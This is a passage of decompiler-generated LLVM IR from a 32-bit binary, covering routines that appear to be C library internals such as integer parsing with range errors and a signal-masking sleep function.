  %v0_14808 = phi i32 [ %v2_14758, %.thread1 ], [ %v2_14798.pre, %dec_label_pc_1476c ]
  store i32 ptrtoint (i32* @global_var_1ec50.641 to i32), i32* %ip.global-to-local, align 4
  %v7_1479c = icmp eq i32 %v0_14808, 1
  br i1 %v7_1479c, label %dec_label_pc_147cc.lr.ph, label %dec_label_pc_14800

dec_label_pc_147cc.lr.ph:                         ; preds = %dec_label_pc_14794
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1ec50.641, align 4
  %v2_147b8 = bitcast i32* %stack_var_-268 to i8*
  %v3_147b8 = call i32 @function_13c90(i8* %v2_147b8, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_147cc

dec_label_pc_147cc:                               ; preds = %dec_label_pc_147cc.lr.ph, %dec_label_pc_147cc
  %v1_147d0 = phi i32 [ 31, %dec_label_pc_147cc.lr.ph ], [ %v1_147dc, %dec_label_pc_147cc ]
  %v4_147d0 = mul i32 %v1_147d0, 4
  %v5_147d0 = add i32 %v4_147d0, %v2_14718
  %v2_147d8 = add i32 %v5_147d0, -264
  %v3_147d8 = inttoptr i32 %v2_147d8 to i32*
  store i32 -1, i32* %v3_147d8, align 4
  %v0_147dc = load i32, i32* %r1.global-to-local, align 4
  %v1_147dc = add i32 %v0_147dc, -1
  store i32 %v1_147dc, i32* %r1.global-to-local, align 4
  %v6_147dc = icmp slt i32 %v1_147dc, 0
  br i1 %v6_147dc, label %dec_label_pc_147e4, label %dec_label_pc_147cc

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147cc
  store i32 %v2_146fc, i32* %r1.global-to-local, align 4
  %v4_147f8 = call i32 @function_14f80(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_1476c

dec_label_pc_14800:                               ; preds = %dec_label_pc_14794
  %v7_14800 = icmp eq i32 %v0_14808, 2
  br i1 %v7_14800, label %dec_label_pc_14808, label %dec_label_pc_14814

dec_label_pc_14808:                               ; preds = %dec_label_pc_14800
  store i32 3, i32* @global_var_1ec50.641, align 4
  %v0_14810 = call i32 @function_146fc()
  %v2_14814.pre = load i32, i32* @global_var_1ec50.641, align 4
  br label %dec_label_pc_14814

dec_label_pc_14814:                               ; preds = %dec_label_pc_14800, %dec_label_pc_14808
  %v1_1481c = phi i32 [ %v0_14808, %dec_label_pc_14800 ], [ %v2_14814.pre, %dec_label_pc_14808 ]
  %v7_14818 = icmp eq i32 %v1_1481c, 3
  br i1 %v7_14818, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_14814
  %v2_14824 = load i32, i32* %ip.global-to-local, align 4
  %v3_14824 = inttoptr i32 %v2_14824 to i32*
  store i32 4, i32* %v3_14824, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14814, %bb27
  call void @__pseudo_cond_branch(i1 %v7_14818, i32 ptrtoint (i32* @global_var_15098.643 to i32))
  br label %dec_label_pc_1482c

dec_label_pc_1482c:                               ; preds = %dec_label_pc_1482c, %.thread3
  %v0_1482c = call i32 @function_146fc()
  br label %dec_label_pc_1482c

; uselistorder directives
  uselistorder i32 %v1_147dc, { 2, 1, 0 }
  uselistorder i32 %v1_14728, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 8, 7, 2 }
  uselistorder i32* @global_var_1ec50.641, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14814, { 1, 0 }
  uselistorder label %dec_label_pc_147cc, { 1, 0 }
  uselistorder label %dec_label_pc_14794, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14718, { 1, 0 }
}

define i32 @function_14844(i8* %arg1) local_unnamed_addr {
dec_label_pc_14844:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_14858 = load i32, i32* @r4, align 4
  store i32 %v3_14858, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_1487c.pre = load i32, i32* bitcast (i32** @global_var_1eba0.646 to i32*), align 4
  br label %dec_label_pc_14874

dec_label_pc_14874:                               ; preds = %dec_label_pc_14874, %dec_label_pc_14844
  %v0_148ac = phi i32 [ %tmp, %dec_label_pc_14844 ], [ %v1_14870, %dec_label_pc_14874 ]
  store i32 %v0_148ac, i32* %r4.global-to-local, align 4
  %v1_14878 = inttoptr i32 %v0_148ac to i8*
  %v2_14878 = load i8, i8* %v1_14878, align 1
  %v3_14878 = zext i8 %v2_14878 to i32
  %v3_14880 = mul nuw nsw i32 %v3_14878, 2
  %v4_14880 = add i32 %v3_14880, %v2_1487c.pre
  %v5_14880 = inttoptr i32 %v4_14880 to i8*
  %v6_14880 = load i8, i8* %v5_14880, align 1
  %v1_14884 = and i8 %v6_14880, 32
  %v2_14884 = icmp eq i8 %v1_14884, 0
  %v1_14870 = add i32 %v0_148ac, 1
  br i1 %v2_14884, label %dec_label_pc_1488c, label %dec_label_pc_14874

dec_label_pc_1488c:                               ; preds = %dec_label_pc_14874
  %v7_1488c = icmp eq i8 %v2_14878, 43
  br i1 %v7_1488c, label %dec_label_pc_148ac, label %dec_label_pc_14894

dec_label_pc_14894:                               ; preds = %dec_label_pc_1488c
  %v7_14894 = icmp eq i8 %v2_14878, 45
  br i1 %v7_14894, label %dec_label_pc_148ac, label %bb

bb:                                               ; preds = %dec_label_pc_14894
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14908

dec_label_pc_148ac:                               ; preds = %dec_label_pc_1488c, %dec_label_pc_14894
  %storemerge30 = phi i32 [ 1, %dec_label_pc_14894 ], [ 0, %dec_label_pc_1488c ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_14870, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14908

dec_label_pc_14908:                               ; preds = %bb, %dec_label_pc_148ac
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_14910 = call i32 @function_133b0(i32 -1, i32 10)
  %v0_14914 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14914, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_14920 = urem i32 %v2_14910, 256
  store i32 %v1_14920, i32* %sl.global-to-local, align 4
  %v0_14924 = call i32 @function_132a0()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_14924, i32* %r8.global-to-local, align 4
  %v0_14938.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14938

dec_label_pc_14934:                               ; preds = %bb48, %dec_label_pc_14994
  %v0_14934 = phi i32 [ %v1_14964, %bb48 ], [ %v0_14934.pre, %dec_label_pc_14994 ]
  store i32 %v0_14934, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14938

dec_label_pc_14938:                               ; preds = %dec_label_pc_14908, %dec_label_pc_14934
  %v0_14964 = phi i32 [ %v0_14938.pre, %dec_label_pc_14908 ], [ %v0_14934, %dec_label_pc_14934 ]
  %v1_14938 = inttoptr i32 %v0_14964 to i8*
  %v2_14938 = load i8, i8* %v1_14938, align 1
  %v3_14938 = zext i8 %v2_14938 to i32
  %v1_1493c = add nsw i32 %v3_14938, -48
  %v1_14940 = urem i32 %v1_1493c, 256
  %v1_14948 = or i32 %v3_14938, 32
  %tmp56 = icmp ult i32 %v1_14940, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_14950

dec_label_pc_14950:                               ; preds = %dec_label_pc_14938
  %tmp57 = icmp ugt i32 %v1_14948, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_14950
  %v1_14954 = add nsw i32 %v1_14948, -87
  %v5_1495c = urem i32 %v1_14954, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14938, %dec_label_pc_14950, %bb42
  %v3_1498c = phi i32 [ %v1_14940, %dec_label_pc_14938 ], [ 40, %dec_label_pc_14950 ], [ %v5_1495c, %bb42 ]
  %v1_14960 = load i32, i32* %r5.global-to-local, align 4
  %v1_14964 = add i32 %v0_14964, 1
  store i32 %v1_14964, i32* %r4.global-to-local, align 4
  %v6_14968 = icmp slt i32 %v3_1498c, %v1_14960
  br i1 %v6_14968, label %dec_label_pc_1496c, label %dec_label_pc_149ac

dec_label_pc_1496c:                               ; preds = %bb43
  %v0_1496c = load i32, i32* %ip.global-to-local, align 4
  %v1_1496c = load i32, i32* %r8.global-to-local, align 4
  %v9_1496c = icmp eq i32 %v0_1496c, %v1_1496c
  br i1 %v9_1496c, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_1496c
  br label %dec_label_pc_1497c

bb44:                                             ; preds = %dec_label_pc_1496c
  %v3_1496c = icmp ult i32 %v0_1496c, %v1_1496c
  br i1 %v3_1496c, label %dec_label_pc_1497c, label %dec_label_pc_14994

dec_label_pc_1497c:                               ; preds = %bb44, %.thread
  %v4_149841727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_1497c = load i32, i32* %sl.global-to-local, align 4
  %v3_1497c = icmp uge i32 %v3_1498c, %v1_1497c
  %v9_1497c = icmp eq i32 %v3_1498c, %v1_1497c
  %v2_14980 = xor i1 %v3_1497c, true
  %v3_14980 = or i1 %v9_1497c, %v2_14980
  br i1 %v3_14980, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_1497c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1497c, %bb45
  %v4_14984 = phi i32 [ %v4_149841727, %dec_label_pc_1497c ], [ 0, %bb45 ]
  %v2_14984 = xor i1 %v9_1497c, true
  %v3_14984 = and i1 %v3_1497c, %v2_14984
  br i1 %v3_14984, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_14984 = urem i32 %v4_14984, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_14988 = phi i32 [ %v5_14984, %bb47 ], [ %v4_14984, %bb46 ]
  %v2_14988 = icmp eq i32 %v0_14988, 0
  br i1 %v2_14988, label %bb48, label %dec_label_pc_14994

bb48:                                             ; preds = %thread-pre-split
  %v4_1498c = mul i32 %v0_1496c, %v1_14960
  %v5_1498c = add i32 %v4_1498c, %v3_1498c
  store i32 %v5_1498c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14934

dec_label_pc_14994:                               ; preds = %bb44, %thread-pre-split
  %v0_14994 = call i32 @function_13c28()
  %v0_14998 = load i32, i32* %r7.global-to-local, align 4
  %v1_14998 = load i32, i32* %fp.global-to-local, align 4
  %v2_14998 = and i32 %v1_14998, %v0_14998
  store i32 %v2_14998, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_149a4 = inttoptr i32 %v0_14994 to i32*
  store i32 34, i32* %v2_149a4, align 4
  %v0_14934.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14934

dec_label_pc_149ac:                               ; preds = %bb43
  %v0_149ac.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_149ac = icmp eq i32 %v0_149ac.pre, 0
  br i1 %v2_149ac, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_149ac
  %v1_149b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_149b0 = inttoptr i32 %v0_149ac.pre to i32*
  store i32 %v1_149b0, i32* %v3_149b0, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_149ac, %bb49
  %v0_149b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_149b4 = icmp eq i32 %v0_149b4, 0
  %. = select i1 %v2_149b4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_149c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_149c0 = icmp eq i32 %v0_149c0, 0
  %v0_149e4.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_149c0, label %dec_label_pc_149dc, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_149e4.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_149cc, label %dec_label_pc_149dc

dec_label_pc_149cc:                               ; preds = %bb53
  %v0_149cc = call i32 @function_13c28()
  %v2_149d4 = inttoptr i32 %v0_149cc to i32*
  store i32 34, i32* %v2_149d4, align 4
  %v0_149d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_149d8, i32* %ip.global-to-local, align 4
  %v0_149dc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %bb53, %bb50, %dec_label_pc_149cc
  %v0_149e4.pre = phi i32 [ %v0_149e4.pre.pre, %bb53 ], [ %v0_149d8, %dec_label_pc_149cc ], [ %v0_149e4.pre.pre, %bb50 ]
  %v0_149dc = phi i32 [ %v0_149b4, %bb53 ], [ %v0_149dc.pre, %dec_label_pc_149cc ], [ %v0_149b4, %bb50 ]
  %v2_149dc = icmp eq i32 %v0_149dc, 0
  br i1 %v2_149dc, label %dec_label_pc_149dc._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_149dc
  %v2_149e0 = sub i32 0, %v0_149e4.pre
  store i32 %v2_149e0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_149dc._crit_edge

dec_label_pc_149dc._crit_edge:                    ; preds = %dec_label_pc_149dc, %bb54
  %v0_149e4 = phi i32 [ %v2_149e0, %bb54 ], [ %v0_149e4.pre, %dec_label_pc_149dc ]
  %v2_149e8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_149e8, i32* @r4, align 4
  ret i32 %v0_149e4

; uselistorder directives
  uselistorder i32 %v0_149e4.pre, { 1, 0 }
  uselistorder i32 %v0_149e4.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_149ac.pre, { 1, 0 }
  uselistorder i32 %v4_14984, { 1, 0 }
  uselistorder i1 %v3_1497c, { 1, 0 }
  uselistorder i32 %v1_1497c, { 1, 0 }
  uselistorder i32 %v1_14964, { 1, 0 }
  uselistorder i32 %v1_14948, { 1, 0 }
  uselistorder i32 %v1_14940, { 1, 0 }
  uselistorder i32 %v0_14934, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 5, 6, 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 ()* @function_132a0, { 3, 2, 4, 1, 0 }
  uselistorder i32 (i32, i32)* @function_133b0, { 7, 2, 1, 12, 3, 9, 5, 4, 11, 10, 8, 6, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 0, 8, 14, 9, 10, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_149dc._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_149dc, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_14994, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14938, { 1, 0 }
  uselistorder label %dec_label_pc_14934, { 1, 0 }
  uselistorder label %dec_label_pc_14908, { 1, 0 }
  uselistorder label %dec_label_pc_148ac, { 1, 0 }
}

define i32 @function_149f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_149f0:
  %stack_var_-16 = alloca i32, align 4
  %v2_149f0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_149f0, i32* @r0, align 4
  %v8_14a0c = call i32 @function_14c9c(i32 %v2_149f0, i32 ptrtoint (i32* @global_var_14c94.595 to i32), i32 ptrtoint (i32* @global_var_1eb80.649 to i32), i32 85148, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_14a1c = call i32 @function_14c94()
  %v2_14a24 = load i32, i32* @global_var_1ec54.653, align 4
  %v2_14a28 = icmp eq i32 %v2_14a24, 0
  br i1 %v2_14a28, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_149f0
  call void @__pseudo_branch(i32 %v2_14a24)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_149f0, %bb
  store i32 %v2_149f0, i32* @r0, align 4
  %v8_14a48 = call i32 @function_14c9c(i32 %v2_149f0, i32 1, i32 ptrtoint (i32* @global_var_1eb80.649 to i32), i32 85148, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_14a48, i32* @r0, align 4
  %v1_14a4c = call i32 @function_14c28(i32 %v8_14a48)
  %v0_14a60 = load i32, i32* @r4, align 4
  %v1_14a64 = call i32 @function_15098(i32 %v0_14a60)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_149f0, { 1, 0, 3, 2 }
  uselistorder i32 ()* @function_14c94, { 4, 3, 2, 1, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 21, 20, 19 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_14c9c, { 1, 0, 5, 4, 3, 2 }
  uselistorder i32 85148, { 1, 0, 3, 4, 2, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_14c94.595 to i32), { 0, 3, 1, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_14a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a84:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14a84 = load i32, i32* @r4, align 4
  store i32 %v3_14a84, i32* %stack_var_-20, align 4
  %v6_14a84 = load i32, i32* @r5, align 4
  %v9_14a84 = load i32, i32* @r6, align 4
  %v16_14a84 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @ip, align 4
  %v2_14a88 = icmp eq i32 %arg1, 0
  %v2_14a8c = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_14a88, label %dec_label_pc_14c10, label %dec_label_pc_14aa4.preheader

dec_label_pc_14aa4.preheader:                     ; preds = %dec_label_pc_14a84
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_14aac17 = add i32 %v16_14a84, 124
  br label %dec_label_pc_14a9c

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14aa4.preheader, %dec_label_pc_14a9c
  %v5_14aac18 = phi i32 [ %v5_14aac17, %dec_label_pc_14aa4.preheader ], [ %v5_14aac, %dec_label_pc_14a9c ]
  %v2_14aa0 = add i32 %v5_14aac18, -136
  %v3_14aa0 = inttoptr i32 %v2_14aa0 to i32*
  store i32 0, i32* %v3_14aa0, align 4
  %v0_14aa4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14aa4 = add i32 %v0_14aa4.pre, -1
  store i32 %v1_14aa4, i32* %r1.global-to-local, align 4
  %v6_14aa4 = icmp slt i32 %v1_14aa4, 0
  %v4_14aac = mul i32 %v1_14aa4, 4
  %v5_14aac = add i32 %v4_14aac, %v16_14a84
  br i1 %v6_14aa4, label %dec_label_pc_14ab4, label %dec_label_pc_14a9c

dec_label_pc_14ab4:                               ; preds = %dec_label_pc_14a9c
  %v2_14ab4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_14ab4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14ac4 = load i32, i32* @ip, align 4
  store i32 %v0_14ac4, i32* %stack_var_-28, align 4
  %v0_14acc = call i32 @function_140b8()
  store i32 %v0_14acc, i32* %r0.global-to-local, align 4
  %v1_14ad0 = load i32, i32* @r5, align 4
  %v5_14ad4 = icmp slt i32 %v0_14acc, %v1_14ad0
  br i1 %v5_14ad4, label %dec_label_pc_14c18, label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14ab4
  %v2_14ad8 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_14ad8, i32* @r4, align 4
  store i32 %v1_14ad0, i32* %r0.global-to-local, align 4
  store i32 %v2_14ab4, i32* %r1.global-to-local, align 4
  %v3_14ae8 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_14ae8 = call i32 @function_138d0(i32 %v1_14ad0, %_TYPEDEF_sigset_t* %v3_14ae8, i32 %v2_14ad8)
  store i32 %v4_14ae8, i32* %r0.global-to-local, align 4
  %v1_14aec = load i32, i32* @r5, align 4
  %v9_14aec = icmp eq i32 %v4_14ae8, %v1_14aec
  br i1 %v9_14aec, label %dec_label_pc_14af4, label %dec_label_pc_14c18

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14ad8
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_14ad8, i32* %r0.global-to-local, align 4
  %v2_14afc = call i32 @function_14094(i32 %v2_14ad8, i32 17)
  store i32 %v2_14afc, i32* %r0.global-to-local, align 4
  %v1_14b00 = load i32, i32* @r5, align 4
  %v9_14b00 = icmp eq i32 %v2_14afc, %v1_14b00
  br i1 %v9_14b00, label %dec_label_pc_14b18.preheader, label %dec_label_pc_14af4.dec_label_pc_14be0_crit_edge

dec_label_pc_14af4.dec_label_pc_14be0_crit_edge:  ; preds = %dec_label_pc_14af4
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_14be0

dec_label_pc_14b18.preheader:                     ; preds = %dec_label_pc_14af4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b10

dec_label_pc_14b10:                               ; preds = %dec_label_pc_14b18.preheader, %dec_label_pc_14b10
  %v5_14b2016 = phi i32 [ %v5_14aac17, %dec_label_pc_14b18.preheader ], [ %v5_14b20, %dec_label_pc_14b10 ]
  %v2_14b14 = add i32 %v5_14b2016, -136
  %v3_14b14 = inttoptr i32 %v2_14b14 to i32*
  store i32 0, i32* %v3_14b14, align 4
  %v0_14b18.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14b18 = add i32 %v0_14b18.pre, -1
  store i32 %v1_14b18, i32* %r1.global-to-local, align 4
  %v6_14b18 = icmp slt i32 %v1_14b18, 0
  %v4_14b20 = mul i32 %v1_14b18, 4
  %v5_14b20 = add i32 %v4_14b20, %v16_14a84
  br i1 %v6_14b18, label %dec_label_pc_14b28, label %dec_label_pc_14b10

dec_label_pc_14b28:                               ; preds = %dec_label_pc_14b10
  store i32 %v2_14ab4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14b30 = call i32 @function_140b8()
  store i32 %v0_14b30, i32* %r0.global-to-local, align 4
  %v1_14b34 = icmp slt i32 %v0_14b30, 0
  br i1 %v1_14b34, label %dec_label_pc_14c18, label %dec_label_pc_14b3c

dec_label_pc_14b3c:                               ; preds = %dec_label_pc_14b28
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_14b48 = call i32 @function_14f80(i32 17, i32* null, i32 %v2_14a8c)
  store i32 %v4_14b48, i32* %r0.global-to-local, align 4
  %v1_14b4c = icmp slt i32 %v4_14b48, 0
  br i1 %v1_14b4c, label %dec_label_pc_14b54, label %dec_label_pc_14b7c

dec_label_pc_14b54:                               ; preds = %dec_label_pc_14b3c
  %v0_14b54 = call i32 @function_13c28()
  store i32 %v2_14ad8, i32* %r1.global-to-local, align 4
  store i32 %v0_14b54, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14b68 = inttoptr i32 %v0_14b54 to i32*
  %v2_14b68 = load i32, i32* %v1_14b68, align 4
  store i32 %v2_14b68, i32* @r4, align 4
  %v3_14b6c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14b6c = call i32 @function_138d0(i32 2, %_TYPEDEF_sigset_t* %v3_14b6c, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_14b74 = load i32, i32* @r4, align 4
  %v1_14b74 = load i32, i32* %r5.global-to-local, align 4
  %v2_14b74 = inttoptr i32 %v1_14b74 to i32*
  store i32 %v0_14b74, i32* %v2_14b74, align 4
  %v17_14c20.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c1c

dec_label_pc_14b7c:                               ; preds = %dec_label_pc_14b3c
  %v2_14b7c = load i32, i32* %stack_var_-424, align 4
  %v7_14b80 = icmp eq i32 %v2_14b7c, 1
  %v2_14b88 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14b88, i32* @r4, align 4
  br i1 %v7_14b80, label %dec_label_pc_14b90, label %dec_label_pc_14bc4

dec_label_pc_14b90:                               ; preds = %dec_label_pc_14b7c
  store i32 %v2_14b88, i32* %r1.global-to-local, align 4
  store i32 %v2_14b88, i32* %r0.global-to-local, align 4
  %v2_14b98 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_14b98 = call i32 @function_1541c(%timespec* %v2_14b98, i32 %v2_14b88)
  store i32 %v3_14b98, i32* %r0.global-to-local, align 4
  store i32 %v3_14b98, i32* %r6.global-to-local, align 4
  %v0_14ba0 = call i32 @function_13c28()
  store i32 %v2_14ad8, i32* %r1.global-to-local, align 4
  store i32 %v0_14ba0, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_14bb4 = inttoptr i32 %v0_14ba0 to i32*
  %v2_14bb4 = load i32, i32* %v1_14bb4, align 4
  store i32 %v2_14bb4, i32* @r4, align 4
  %v3_14bb8 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14bb8 = call i32 @function_138d0(i32 2, %_TYPEDEF_sigset_t* %v3_14bb8, i32 0)
  store i32 %v4_14bb8, i32* %r0.global-to-local, align 4
  %v0_14bbc = load i32, i32* @r4, align 4
  %v1_14bbc = load i32, i32* %r5.global-to-local, align 4
  %v2_14bbc = inttoptr i32 %v1_14bbc to i32*
  store i32 %v0_14bbc, i32* %v2_14bbc, align 4
  %v0_14bec.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14bc4:                               ; preds = %dec_label_pc_14b7c
  store i32 %v2_14ad8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_14bd0 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14bd0 = call i32 @function_138d0(i32 2, %_TYPEDEF_sigset_t* %v3_14bd0, i32 0)
  store i32 %v4_14bd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14be0

dec_label_pc_14be0:                               ; preds = %dec_label_pc_14af4.dec_label_pc_14be0_crit_edge, %dec_label_pc_14bc4
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_14af4.dec_label_pc_14be0_crit_edge ], [ %v2_14b88, %dec_label_pc_14bc4 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_14be4 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_14be4 = call i32 @function_1541c(%timespec* %v2_14be4, i32 %storemerge.pre-phi)
  store i32 %v3_14be4, i32* %r0.global-to-local, align 4
  store i32 %v3_14be4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %dec_label_pc_14b90, %dec_label_pc_14be0
  %v0_14bec = phi i32 [ %v0_14bec.pr, %dec_label_pc_14b90 ], [ %v3_14be4, %dec_label_pc_14be0 ]
  %v2_14bec = icmp eq i32 %v0_14bec, 0
  br i1 %v2_14bec, label %dec_label_pc_14c10, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %dec_label_pc_14bec
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_14bfc = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_14bfc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c1c

dec_label_pc_14c10:                               ; preds = %dec_label_pc_14a84, %dec_label_pc_14bec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c1c

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14ad8, %dec_label_pc_14b28, %dec_label_pc_14ab4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14c1c

dec_label_pc_14c1c:                               ; preds = %dec_label_pc_14bf4, %dec_label_pc_14c10, %dec_label_pc_14b54, %dec_label_pc_14c18
